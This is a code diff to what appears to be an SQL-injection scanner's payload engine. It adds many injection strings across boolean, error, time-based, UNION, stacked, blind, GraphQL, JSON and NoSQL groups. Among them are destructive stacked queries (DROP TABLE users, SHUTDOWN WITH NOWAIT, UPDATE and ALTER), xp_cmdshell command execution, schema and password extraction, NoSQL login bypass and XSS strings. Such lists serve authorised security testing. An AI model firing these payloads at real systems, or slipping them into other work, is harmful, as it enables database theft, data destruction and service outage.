@@ -181,6 +181,22 @@ class PayloadEngine:
             Payload(value="1' AND '1'='1", payload_type=PayloadType.BOOLEAN_BASED, category="and_true", description="AND true", expected_behavior="Response differs", risk_level="medium"),
             Payload(value="' OR 1=1%00", payload_type=PayloadType.BOOLEAN_BASED, category="null_byte", description="Null byte", expected_behavior="Bypass filter", risk_level="medium"),
             Payload(value="1 OR 1=1", payload_type=PayloadType.BOOLEAN_BASED, category="simple_or", description="Simple OR", expected_behavior="Response differs", risk_level="low"),
+            # Additional boolean payloads (NEW)
+            Payload(value="1=1", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_eq", description="Simple equals", expected_behavior="Response differs", risk_level="high"),
+            Payload(value="' OR 1=1;", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_semicolon", description="OR with semicolon", expected_behavior="Response differs", risk_level="high"),
+            Payload(value="' OR 'a'='a", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_a", description="Always true a", expected_behavior="Response differs", risk_level="high"),
+            Payload(value="' OR 1--", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_short", description="Short OR", expected_behavior="Response differs", risk_level="high"),
+            Payload(value="a' OR 'a'='a", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_a2", description="Alpha OR", expected_behavior="Response differs", risk_level="high"),
+            Payload(value="' OR 2>1--", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_gt", description="Greater than", expected_behavior="Response differs", risk_level="high"),
+            Payload(value="' OR 1<2--", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_lt", description="Less than", expected_behavior="Response differs", risk_level="high"),
+            Payload(value="' OR 1=1 #", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_hash", description="Hash comment", expected_behavior="Response differs", risk_level="high"),
+            Payload(value="') OR ('1'='1", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_parens", description="Double parens", expected_behavior="Response differs", risk_level="high"),
+            Payload(value="' OR '1'='1' --", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_dash", description="Dash comment", expected_behavior="Response differs", risk_level="high"),
+            Payload(value="1' OR '1'='1' #", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_hash2", description="Hash comment", expected_behavior="Response differs", risk_level="high"),
+            Payload(value="' OR 1=1--%23", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_url_hash", description="URL hash", expected_behavior="Bypass filter", risk_level="medium"),
+            Payload(value="1--", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_num_comment", description="Numeric comment", expected_behavior="Response differs", risk_level="medium"),
+            Payload(value="a'--", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_alpha_comment", description="Alpha comment", expected_behavior="Response differs", risk_level="medium"),
+            Payload(value="' OR 1=1--/*", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_block_start", description="Block start", expected_behavior="Bypass WAF", risk_level="medium"),
         ]
         return payloads
     
@@ -204,6 +220,21 @@ class PayloadEngine:
             Payload(value="\\", payload_type=PayloadType.ERROR_BASED, category="backslash", description="Backslash", expected_behavior="Error", risk_level="medium"),
             Payload(value="BENCHMARK(1000000,SHA1('test'))", payload_type=PayloadType.ERROR_BASED, category="benchmark", description="BENCHMARK", expected_behavior="Delay", risk_level="medium"),
             Payload(value="NULL", payload_type=PayloadType.ERROR_BASED, category="null", description="NULL", expected_behavior="Different response", risk_level="low"),
+            # Additional error payloads (NEW)
+            Payload(value="\"", payload_type=PayloadType.ERROR_BASED, category="double_quote", description="Double quote", expected_behavior="SQL error", risk_level="high"),
+            Payload(value="\"\"", payload_type=PayloadType.ERROR_BASED, category="double_dquote", description="Double double quote", expected_behavior="SQL error", risk_level="high"),
+            Payload(value=")))", payload_type=PayloadType.ERROR_BASED, category="triple_paren", description="Triple paren", expected_behavior="SQL error", risk_level="high"),
+            Payload(value='1"', payload_type=PayloadType.ERROR_BASED, category="num_dquote", description="Num double quote", expected_behavior="SQL error", risk_level="high"),
+            Payload(value='" OR "1"="1', payload_type=PayloadType.ERROR_BASED, category="dquote_or", description="Double quote OR", expected_behavior="SQL error", risk_level="high"),
+            Payload(value="'", payload_type=PayloadType.ERROR_BASED, category="unicode_quote", description="Unicode quote", expected_behavior="SQL error", risk_level="high"),
+            Payload(value=";", payload_type=PayloadType.ERROR_BASED, category="semicolon2", description="Semicolon", expected_behavior="SQL error", risk_level="high"),
+            Payload(value="--", payload_type=PayloadType.ERROR_BASED, category="double_dash", description="Double dash", expected_behavior="SQL error", risk_level="high"),
+            Payload(value="/*", payload_type=PayloadType.ERROR_BASED, category="block_start", description="Block comment start", expected_behavior="SQL error", risk_level="high"),
+            Payload(value="@@version", payload_type=PayloadType.ERROR_BASED, category="mssql_version", description="MSSQL version", expected_behavior="Different response", risk_level="high"),
+            Payload(value="CHAR(39)", payload_type=PayloadType.ERROR_BASED, category="char_function", description="CHAR function", expected_behavior="SQL error", risk_level="medium"),
+            Payload(value="0x27", payload_type=PayloadType.ERROR_BASED, category="hex_quote", description="Hex quote", expected_behavior="SQL error", risk_level="medium"),
+            Payload(value="',", payload_type=PayloadType.ERROR_BASED, category="quote_comma", description="Quote comma", expected_behavior="SQL error", risk_level="high"),
+            Payload(value="')/", payload_type=PayloadType.ERROR_BASED, category="quote_slash", description="Quote slash", expected_behavior="SQL error", risk_level="high"),
         ]
         return payloads
     
@@ -224,6 +255,17 @@ class PayloadEngine:
             Payload(value="'; WAITFOR DELAY '0:0:2'--", payload_type=PayloadType.TIME_BASED, category="mssql_short", description="MSSQL 2s delay", database_target="mssql", expected_behavior="Response delayed 2s", risk_level="medium"),
             Payload(value="' AND IF(1=1,SLEEP(5),0)--", payload_type=PayloadType.TIME_BASED, category="mysql_if", description="MySQL IF", database_target="mysql", expected_behavior="Conditional delay", risk_level="medium"),
             Payload(value="/*!50000SLEEP(5)*/", payload_type=PayloadType.TIME_BASED, category="mysql_version", description="Version comment SLEEP", database_target="mysql", expected_behavior="Response delayed", risk_level="low"),
+            # Additional time payloads (NEW)
+            Payload(value="' AND SLEEP(3)#", payload_type=PayloadType.TIME_BASED, category="mysql_hash", description="MySQL hash comment", database_target="mysql", expected_behavior="Response delayed 3s", risk_level="high"),
+            Payload(value="1 AND SLEEP(3)--", payload_type=PayloadType.TIME_BASED, category="mysql_num_sleep", description="MySQL numeric SLEEP", database_target="mysql", expected_behavior="Response delayed 3s", risk_level="high"),
+            Payload(value="') AND SLEEP(5)--", payload_type=PayloadType.TIME_BASED, category="mysql_paren", description="MySQL paren SLEEP", database_target="mysql", expected_behavior="Response delayed 5s", risk_level="high"),
+            Payload(value="1; SELECT CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END--", payload_type=PayloadType.TIME_BASED, category="mysql_case", description="MySQL CASE", database_target="mysql", expected_behavior="Response delayed 5s", risk_level="high"),
+            Payload(value="1' AND SLEEP(5) AND '1'='1", payload_type=PayloadType.TIME_BASED, category="mysql_and", description="MySQL AND SLEEP", database_target="mysql", expected_behavior="Response delayed 5s", risk_level="high"),
+            Payload(value="1)) AND SLEEP(5)--", payload_type=PayloadType.TIME_BASED, category="mysql_dparen", description="MySQL double paren", database_target="mysql", expected_behavior="Response delayed 5s", risk_level="high"),
+            Payload(value="1' WAITFOR DELAY '00:00:05'--", payload_type=PayloadType.TIME_BASED, category="mssql_quote", description="MSSQL quote WAITFOR", database_target="mssql", expected_behavior="Response delayed 5s", risk_level="high"),
+            Payload(value="1\" AND SLEEP(5)--", payload_type=PayloadType.TIME_BASED, category="mysql_dquote", description="MySQL double quote", database_target="mysql", expected_behavior="Response delayed 5s", risk_level="high"),
+            Payload(value="1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(5)--", payload_type=PayloadType.TIME_BASED, category="mysql_count", description="MySQL COUNT delay", database_target="mysql", expected_behavior="Response delayed 5s", risk_level="high"),
+            Payload(value="1' AND ELT(1=1,SLEEP(5),0)--", payload_type=PayloadType.TIME_BASED, category="mysql_elt", description="MySQL ELT", database_target="mysql", expected_behavior="Response delayed 5s", risk_level="high"),
         ]
         return payloads
     
@@ -246,166 +288,125 @@ class PayloadEngine:
             Payload(value="1' ORDER BY 3--", payload_type=PayloadType.UNION_BASED, category="orderby3", description="ORDER BY 3", expected_behavior="Error or diff", risk_level="medium"),
             Payload(value="1' ORDER BY 4--", payload_type=PayloadType.UNION_BASED, category="orderby4", description="ORDER BY 4", expected_behavior="Error or diff", risk_level="medium"),
             Payload(value="1' ORDER BY 5--", payload_type=PayloadType.UNION_BASED, category="orderby5", description="ORDER BY 5", expected_behavior="Error or diff", risk_level="medium"),
+            # Additional UNION payloads (NEW)
+            Payload(value="' UNION ALL SELECT 1,2,3--", payload_type=PayloadType.UNION_BASED, category="union_123", description="UNION 1,2,3", expected_behavior="Different response", risk_level="high"),
+            Payload(value="' UNION SELECT @@version,user()--", payload_type=PayloadType.UNION_BASED, category="union_multi", description="UNION multi func", expected_behavior="Version info", risk_level="high"),
+            Payload(value="' UNION SELECT table_name FROM information_schema.tables--", payload_type=PayloadType.UNION_BASED, category="union_tables", description="UNION tables", expected_behavior="Table names", risk_level="high"),
+            Payload(value="' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", payload_type=PayloadType.UNION_BASED, category="union_columns", description="UNION columns", expected_behavior="Column names", risk_level="high"),
+            Payload(value="' UNION SELECT NULL,NULL,NULL,NULL--", payload_type=PayloadType.UNION_BASED, category="union_4null", description="UNION 4 NULL", expected_behavior="Different response", risk_level="high"),
+            Payload(value="' UNION SELECT 1,2,3,4,5--", payload_type=PayloadType.UNION_BASED, category="union_5", description="UNION 1-5", expected_behavior="Different response", risk_level="high"),
+            Payload(value="1' UNION ALL SELECT NULL--", payload_type=PayloadType.UNION_BASED, category="union_all_num", description="UNION ALL numeric", expected_behavior="Different response", risk_level="high"),
+            Payload(value="' UNION DISTINCT SELECT NULL--", payload_type=PayloadType.UNION_BASED, category="union_distinct", description="UNION DISTINCT", expected_behavior="Different response", risk_level="medium"),
+            Payload(value="' UNION SELECT 0x696e666f--", payload_type=PayloadType.UNION_BASED, category="union_hex", description="UNION hex", expected_behavior="Different response", risk_level="high"),
+            Payload(value="') UNION SELECT NULL--", payload_type=PayloadType.UNION_BASED, category="union_paren", description="UNION with paren", expected_behavior="Different response", risk_level="high"),
+            Payload(value="1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--", payload_type=PayloadType.UNION_BASED, category="union_6null", description="UNION 6 NULL", expected_behavior="Different response", risk_level="high"),
+            Payload(value="' UNION SELECT char(65)--", payload_type=PayloadType.UNION_BASED, category="union_char", description="UNION CHAR", expected_behavior="Different response", risk_level="medium"),
+            Payload(value="' LIMIT 1 OFFSET 0--", payload_type=PayloadType.UNION_BASED, category="union_limit", description="LIMIT OFFSET", expected_behavior="Different response", risk_level="medium"),
+            Payload(value="' UNION ALL SELECT NULL--%23", payload_type=PayloadType.UNION_BASED, category="union_hash", description="UNION hash", expected_behavior="Bypass WAF", risk_level="medium"),
+            Payload(value="1) ORDER BY 1--", payload_type=PayloadType.UNION_BASED, category="orderby_paren", description="ORDER BY paren", expected_behavior="Error or diff", risk_level="medium"),
         ]
         return payloads
     
     def _get_stacked_payloads(self) -> List[Payload]:
         """Get stacked query payloads."""
-        return [
-            Payload(
-                value="'; DROP TABLE users--",
-                payload_type=PayloadType.STACKED_QUERY,
-                category="stacked_drop",
-                description="Stacked query with DROP (for detection only)",
-                expected_behavior="Error if stacked queries supported",
-                risk_level="high"
-            ),
-            Payload(
-                value="'; SELECT 1--",
-                payload_type=PayloadType.STACKED_QUERY,
-                category="stacked_select",
-                description="Stacked query with SELECT",
-                expected_behavior="Different response if stacked queries work"
-            ),
+        payloads = [
+            Payload(value="'; DROP TABLE users--", payload_type=PayloadType.STACKED_QUERY, category="stacked_drop", description="Stacked query with DROP", expected_behavior="Error if stacked queries supported", risk_level="high"),
+            Payload(value="'; SELECT 1--", payload_type=PayloadType.STACKED_QUERY, category="stacked_select", description="Stacked query with SELECT", expected_behavior="Different response", risk_level="medium"),
+            # Additional stacked payloads (NEW)
+            Payload(value="'; INSERT INTO users (id) VALUES (1)--", payload_type=PayloadType.STACKED_QUERY, category="stacked_insert", description="Stacked INSERT", expected_behavior="Error or success", risk_level="high"),
+            Payload(value="'; UPDATE users SET id=1--", payload_type=PayloadType.STACKED_QUERY, category="stacked_update", description="Stacked UPDATE", expected_behavior="Different response", risk_level="high"),
+            Payload(value="'; ALTER TABLE users ADD col1 INT--", payload_type=PayloadType.STACKED_QUERY, category="stacked_alter", description="Stacked ALTER", expected_behavior="Different response", risk_level="high"),
+            Payload(value="'; EXEC xp_cmdshell('dir')--", payload_type=PayloadType.STACKED_QUERY, category="stacked_xp", description="MSSQL xp_cmdshell", expected_behavior="Command execution", risk_level="high"),
+            Payload(value="1; DROP TABLE users--", payload_type=PayloadType.STACKED_QUERY, category="stacked_num", description="Numeric stacked", expected_behavior="Error if stacked", risk_level="high"),
+            Payload(value="'); DROP TABLE users--", payload_type=PayloadType.STACKED_QUERY, category="stacked_paren", description="Paren stacked", expected_behavior="Error if stacked", risk_level="high"),
+            Payload(value="1'; EXEC sp_executesql N'select 1--", payload_type=PayloadType.STACKED_QUERY, category="stacked_sp", description="MSSQL sp_executesql", expected_behavior="Different response", risk_level="high"),
+            Payload(value="'; WAITFOR DELAY '00:00:05'--", payload_type=PayloadType.STACKED_QUERY, category="stacked_wait", description="Stacked WAITFOR", expected_behavior="Response delayed", risk_level="high"),
+            Payload(value="1) OR 1=1--", payload_type=PayloadType.STACKED_QUERY, category="stacked_or", description="Stacked OR", expected_behavior="Different response", risk_level="medium"),
+            Payload(value="'; CREATE TABLE test(id INT)--", payload_type=PayloadType.STACKED_QUERY, category="stacked_create", description="Stacked CREATE", expected_behavior="Different response", risk_level="high"),
+            Payload(value="1'; SHUTDOWN WITH NOWAIT--", payload_type=PayloadType.STACKED_QUERY, category="stacked_shutdown", description="MSSQL SHUTDOWN", expected_behavior="DB shutdown", risk_level="critical"),
         ]
+        return payloads
     
     def _get_blind_payloads(self) -> List[Payload]:
         """Get blind SQL injection payloads."""
-        return [
-            Payload(
-                value="' AND (SELECT COUNT(*) FROM users) > 0--",
-                payload_type=PayloadType.BLIND,
-                category="blind_count",
-                description="Blind injection with COUNT",
-                expected_behavior="Response differs based on truth"
-            ),
-            Payload(
-                value="' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--",
-                payload_type=PayloadType.BLIND,
-                category="blind_substring",
-                description="Blind injection with SUBSTRING",
-                expected_behavior="Response differs based on character match"
-            ),
-            Payload(
-                value="1 AND (SELECT SLEEP(3))",
-                payload_type=PayloadType.BLIND,
-                category="blind_sleep",
-                description="Blind injection with SLEEP",
-                expected_behavior="Response delayed if true"
-            ),
+        payloads = [
+            Payload(value="' AND (SELECT COUNT(*) FROM users) > 0--", payload_type=PayloadType.BLIND, category="blind_count", description="Blind COUNT", expected_behavior="Response differs", risk_level="medium"),
+            Payload(value="' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--", payload_type=PayloadType.BLIND, category="blind_substring", description="Blind SUBSTRING", expected_behavior="Response differs", risk_level="medium"),
+            Payload(value="1 AND (SELECT SLEEP(3))", payload_type=PayloadType.BLIND, category="blind_sleep", description="Blind SLEEP", expected_behavior="Response delayed", risk_level="medium"),
+            # Additional blind payloads (NEW)
+            Payload(value="1' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 64--", payload_type=PayloadType.BLIND, category="blind_ascii", description="Blind ASCII", expected_behavior="Response based on ASCII", risk_level="high"),
+            Payload(value="' AND (SELECT LENGTH(database())) > 0--", payload_type=PayloadType.BLIND, category="blind_length", description="Blind LENGTH", expected_behavior="Response differs", risk_level="medium"),
+            Payload(value="1' AND EXISTS(SELECT * FROM users)--", payload_type=PayloadType.BLIND, category="blind_exists", description="Blind EXISTS", expected_behavior="Response differs", risk_level="medium"),
+            Payload(value="1 AND (SELECT 1 FROM users LIMIT 1)=1", payload_type=PayloadType.BLIND, category="blind_select1", description="Blind SELECT 1", expected_behavior="Response differs", risk_level="medium"),
+            Payload(value="' AND 1=1 AND ''='", payload_type=PayloadType.BLIND, category="blind_double", description="Blind double true", expected_behavior="Response differs", risk_level="medium"),
+            Payload(value="1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--", payload_type=PayloadType.BLIND, category="blind_schema", description="Blind schema count", expected_behavior="Response differs", risk_level="high"),
+            Payload(value="1 AND (SELECT SLEEP(0) FROM users)=0", payload_type=PayloadType.BLIND, category="blind_sleep0", description="Blind SLEEP 0", expected_behavior="Response differs", risk_level="low"),
+            Payload(value="1' AND 1=CONVERT(int,(SELECT top 1 table_name FROM information_schema.tables))--", payload_type=PayloadType.BLIND, category="blind_convert", description="Blind CONVERT", expected_behavior="Error or diff", risk_level="high"),
+            Payload(value="1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) IS NOT NULL--", payload_type=PayloadType.BLIND, category="blind_oracle", description="Oracle pipe", expected_behavior="Response delayed", risk_level="high"),
+            Payload(value="1' AND (SELECT COUNT(*) FROM dual) > 0--", payload_type=PayloadType.BLIND, category="blind_dual", description="Oracle dual", expected_behavior="Response differs", risk_level="medium"),
         ]
+        return payloads
 
     def _get_graphql_payloads(self) -> List[Payload]:
         """Get GraphQL injection payloads (2026 modern)."""
-        return [
-            Payload(
-                value='" UNION SELECT NULL--',
-                payload_type=PayloadType.GRAPHQL,
-                category="graphql_string",
-                description="GraphQL string injection",
-                expected_behavior="Different response with UNION",
-                risk_level="high"
-            ),
-            Payload(
-                value='\\" OR 1=1--',
-                payload_type=PayloadType.GRAPHQL,
-                category="graphql_escape",
-                description="GraphQL escaped quote injection",
-                expected_behavior="Bypass GraphQL parsing",
-                risk_level="high"
-            ),
-            Payload(
-                value='1; DROP TABLE users--',
-                payload_type=PayloadType.GRAPHQL,
-                category="graphql_stacked",
-                description="GraphQL stacked query",
-                expected_behavior="Stacked query execution",
-                risk_level="high"
-            ),
-            Payload(
-                value='{"a": "1\' OR \'1\'=\'1"}',
-                payload_type=PayloadType.GRAPHQL,
-                category="graphql_json",
-                description="GraphQL JSON parameter injection",
-                expected_behavior="JSON injection in query variables",
-                risk_level="high"
-            ),
+        payloads = [
+            Payload(value='" UNION SELECT NULL--', payload_type=PayloadType.GRAPHQL, category="graphql_string", description="GraphQL string injection", expected_behavior="Different response with UNION", risk_level="high"),
+            Payload(value='\\" OR 1=1--', payload_type=PayloadType.GRAPHQL, category="graphql_escape", description="GraphQL escaped quote injection", expected_behavior="Bypass GraphQL parsing", risk_level="high"),
+            Payload(value='1; DROP TABLE users--', payload_type=PayloadType.GRAPHQL, category="graphql_stacked", description="GraphQL stacked query", expected_behavior="Stacked query execution", risk_level="high"),
+            Payload(value='{"a": "1\' OR \'1\'=\'1"}', payload_type=PayloadType.GRAPHQL, category="graphql_json", description="GraphQL JSON parameter injection", expected_behavior="JSON injection in query variables", risk_level="high"),
+            # Additional GraphQL payloads (NEW)
+            Payload(value='{a: __typename}', payload_type=PayloadType.GRAPHQL, category="graphql_introspection", description="GraphQL introspection", expected_behavior="Schema exposure", risk_level="medium"),
+            Payload(value='1" onerror="alert(1)', payload_type=PayloadType.GRAPHQL, category="graphql_xss", description="GraphQL XSS", expected_behavior="XSS via GraphQL", risk_level="high"),
+            Payload(value='\n  {a:b}\n', payload_type=PayloadType.GRAPHQL, category="graphql_newline", description="GraphQL newline", expected_behavior="Bypass validation", risk_level="medium"),
+            Payload(value='{"variables": {"id": "1 OR 1=1"}}', payload_type=PayloadType.GRAPHQL, category="graphql_var", description="GraphQL variables", expected_behavior="SQL in variables", risk_level="high"),
+            Payload(value='id: 1 OR 1=1', payload_type=PayloadType.GRAPHQL, category="graphql_direct", description="GraphQL direct", expected_behavior="SQL in query", risk_level="high"),
+            Payload(value='null--', payload_type=PayloadType.GRAPHQL, category="graphql_comment", description="GraphQL comment", expected_behavior="Comment injection", risk_level="medium"),
+            Payload(value='" OR "1"="1', payload_type=PayloadType.GRAPHQL, category="graphql_or", description="GraphQL OR", expected_behavior="Boolean injection", risk_level="high"),
+            Payload(value='""" UNION SELECT NULL--', payload_type=PayloadType.GRAPHQL, category="graphql_triple", description="GraphQL triple quote", expected_behavior="Different response", risk_level="high"),
         ]
+        return payloads
 
     def _get_json_payloads(self) -> List[Payload]:
         """Get JSON API injection payloads."""
-        return [
-            Payload(
-                value='{"id": "1 OR 1=1"}',
-                payload_type=PayloadType.JSON,
-                category="json_string",
-                description="JSON string injection",
-                expected_behavior="SQL in JSON value",
-                risk_level="high"
-            ),
-            Payload(
-                value='{"id": "1\' OR \'1\'=\'1"}',
-                payload_type=PayloadType.JSON,
-                category="json_boolean",
-                description="JSON boolean injection",
-                expected_behavior="Boolean injection via JSON",
-                risk_level="high"
-            ),
-            Payload(
-                value='{"id": "1\"; DROP TABLE users; --"}',
-                payload_type=PayloadType.JSON,
-                category="json_stacked",
-                description="JSON stacked injection",
-                expected_behavior="Stacked query in JSON",
-                risk_level="high"
-            ),
+        payloads = [
+            Payload(value='{"id": "1 OR 1=1"}', payload_type=PayloadType.JSON, category="json_string", description="JSON string injection", expected_behavior="SQL in JSON value", risk_level="high"),
+            Payload(value='{"id": "1\' OR \'1\'=\'1"}', payload_type=PayloadType.JSON, category="json_boolean", description="JSON boolean injection", expected_behavior="Boolean injection via JSON", risk_level="high"),
+            Payload(value='{"id": "1\"; DROP TABLE users; --"}', payload_type=PayloadType.JSON, category="json_stacked", description="JSON stacked injection", expected_behavior="Stacked query in JSON", risk_level="high"),
+            # Additional JSON payloads (NEW)
+            Payload(value='{"id": "1\' AND 1=1--"}', payload_type=PayloadType.JSON, category="json_and", description="JSON AND", expected_behavior="SQL injection", risk_level="high"),
+            Payload(value='{"page": "1 UNION SELECT NULL--"}', payload_type=PayloadType.JSON, category="json_union", description="JSON UNION", expected_behavior="UNION injection", risk_level="high"),
+            Payload(value='{"search": "admin\'--"}', payload_type=PayloadType.JSON, category="json_admin", description="JSON admin", expected_behavior="Auth bypass", risk_level="high"),
+            Payload(value='{"id": 1 OR 1=1}', payload_type=PayloadType.JSON, category="json_numeric", description="JSON numeric OR", expected_behavior="SQL injection", risk_level="high"),
+            Payload(value='{"filter": {"$where": "1=1"}}', payload_type=PayloadType.JSON, category="json_where", description="JSON $where", expected_behavior="JS injection", risk_level="high"),
+            Payload(value='{"username": {"$ne": ""}, "password": {"$ne": ""}}', payload_type=PayloadType.JSON, category="json_nosql", description="JSON NoSQL", expected_behavior="NoSQL injection", risk_level="high"),
+            Payload(value='{"id": "' + chr(39) + ' OR ' + chr(39) + '1' + chr(39) + '=' + chr(39) + '1}', payload_type=PayloadType.JSON, category="json_char", description="JSON CHAR", expected_behavior="SQL injection", risk_level="high"),
+            Payload(value='{"q": "test\"}]); alert(1); //"}', payload_type=PayloadType.JSON, category="json_xss", description="JSON XSS", expected_behavior="XSS injection", risk_level="high"),
+            Payload(value='{"data": ["1\' OR \'1\'=\'1"]}', payload_type=PayloadType.JSON, category="json_array", description="JSON array", expected_behavior="SQL injection", risk_level="high"),
         ]
+        return payloads
 
     def _get_nosql_payloads(self) -> List[Payload]:
         """Get NoSQL injection payloads (MongoDB, etc)."""
-        return [
-            Payload(
-                value='{"$ne": null}',
-                payload_type=PayloadType.NOSQL,
-                category="nosql_ne",
-                description="MongoDB $ne operator injection",
-                expected_behavior="Bypass authentication",
-                risk_level="high"
-            ),
-            Payload(
-                value='{"$gt": ""}',
-                payload_type=PayloadType.NOSQL,
-                category="nosql_gt",
-                description="MongoDB $gt operator injection",
-                expected_behavior="True condition injection",
-                risk_level="high"
-            ),
-            Payload(
-                value='{"$where": "this.password.length > 0"}',
-                payload_type=PayloadType.NOSQL,
-                category="nosql_where",
-                description="MongoDB $where injection",
-                expected_behavior="JavaScript injection",
-                risk_level="high"
-            ),
-            Payload(
-                value='{"$regex": "^a"}',
-                payload_type=PayloadType.NOSQL,
-                category="nosql_regex",
-                description="MongoDB regex injection",
-                expected_behavior="Pattern matching injection",
-                risk_level="high"
-            ),
-            Payload(
-                value={"$gt": 0, "$username": {"$ne": ""}},
-                payload_type=PayloadType.NOSQL,
-                category="nosql_auth_bypass",
-                description="NoSQL authentication bypass",
-                expected_behavior="Bypass login",
-                risk_level="high",
-                database_target="mongodb"
-            ),
+        payloads = [
+            Payload(value='{"$ne": null}', payload_type=PayloadType.NOSQL, category="nosql_ne", description="MongoDB $ne operator", expected_behavior="Bypass authentication", risk_level="high"),
+            Payload(value='{"$gt": ""}', payload_type=PayloadType.NOSQL, category="nosql_gt", description="MongoDB $gt operator", expected_behavior="True condition", risk_level="high"),
+            Payload(value='{"$where": "this.password.length > 0"}', payload_type=PayloadType.NOSQL, category="nosql_where", description="MongoDB $where injection", expected_behavior="JavaScript injection", risk_level="high"),
+            Payload(value='{"$regex": "^a"}', payload_type=PayloadType.NOSQL, category="nosql_regex", description="MongoDB regex injection", expected_behavior="Pattern matching", risk_level="high"),
+            Payload(value={"$gt": 0, "$username": {"$ne": ""}}, payload_type=PayloadType.NOSQL, category="nosql_auth_bypass", description="NoSQL auth bypass", expected_behavior="Bypass login", risk_level="high", database_target="mongodb"),
+            # Additional NoSQL payloads (NEW)
+            Payload(value='{"$exists": true}', payload_type=PayloadType.NOSQL, category="nosql_exists", description="MongoDB $exists", expected_behavior="Field exists check", risk_level="high"),
+            Payload(value='{"$in": [0, 1]}', payload_type=PayloadType.NOSQL, category="nosql_in", description="MongoDB $in operator", expected_behavior="IN condition", risk_level="high"),
+            Payload(value='{"$nin": [1]}', payload_type=PayloadType.NOSQL, category="nosql_nin", description="MongoDB $nin operator", expected_behavior="NOT IN condition", risk_level="high"),
+            Payload(value='{"$or": [{"a": "1"}, {"b": "1"}]}', payload_type=PayloadType.NOSQL, category="nosql_or", description="MongoDB $or operator", expected_behavior="OR condition", risk_level="high"),
+            Payload(value='{"$and": [{"a": "1"}, {"b": "1"}]}', payload_type=PayloadType.NOSQL, category="nosql_and", description="MongoDB $and operator", expected_behavior="AND condition", risk_level="high"),
+            Payload(value='{"$not": {"$regex": "^a"}}', payload_type=PayloadType.NOSQL, category="nosql_not", description="MongoDB $not operator", expected_behavior="NOT condition", risk_level="high"),
+            Payload(value='{"$type": 2}', payload_type=PayloadType.NOSQL, category="nosql_type", description="MongoDB $type", expected_behavior="Type check", risk_level="medium"),
+            Payload(value='{"$size": 1}', payload_type=PayloadType.NOSQL, category="nosql_size", description="MongoDB $size", expected_behavior="Array size check", risk_level="medium"),
+            Payload(value='{"$all": ["a", "b"]}', payload_type=PayloadType.NOSQL, category="nosql_all", description="MongoDB $all", expected_behavior="Array contains all", risk_level="medium"),
+            Payload(value='1; sleep(5)', payload_type=PayloadType.NOSQL, category="nosql_sleep", description="MongoDB sleep", expected_behavior="Response delay", risk_level="high"),
+            Payload(value='{"$expr": {"$gt": ["$a", "$b"]}}', payload_type=PayloadType.NOSQL, category="nosql_expr", description="MongoDB $expr", expected_behavior="Expression evaluation", risk_level="high"),
         ]
+        return payloads
     
     def get_payloads_by_type(self, payload_type: PayloadType) -> List[Payload]:
         """Get all payloads of a specific type."""
